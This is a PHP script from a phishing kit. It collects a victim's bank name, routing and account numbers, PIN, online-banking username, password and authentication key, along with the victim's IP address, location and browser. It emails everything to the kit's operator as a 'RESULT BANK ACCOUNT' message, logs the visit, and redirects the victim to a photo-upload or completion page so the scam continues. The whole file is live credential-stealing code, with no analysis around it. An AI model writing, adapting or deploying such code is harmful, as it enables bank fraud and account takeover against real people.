<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';
if($_POST['routing'] == "") {
	exit();
}
$message  = "++---------------------------[ BANK ACCOUNT ]----------------------------++\n";
$message .= "Bank						: ".$_POST['bankname']."\n";
$message .= "Routing Number				: ".$_POST['routing']."\n";
$message .= "Account Number				: ".$_POST['accnumber']."\n";
$message .= "PIN Number					: ".$_POST['pinbank']."\n";
$message .= "Username					: ".$_POST['userbank']."\n";
$message .= "Password					: ".$_POST['passbank']."\n";
$message .= "Authentication Key			: ".$_POST['authkeys']."\n";
$message .= "++--------------------------[ PC INFORMATION ]---------------------------++\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "++--------------------------[ YS ]-----------------------------++\n";

$subject = "RESULT BANK ACCOUNT: ".$_POST['bankname']." [ $cn - $os - $ip2 ]";
$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
kirim_mail($to,$from,$subject,$message);
$click = fopen("../logs/total_bank.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("../logs/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi Form Bank"."\n");
fclose($click);

if($getphoto == 'on') {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
}
?>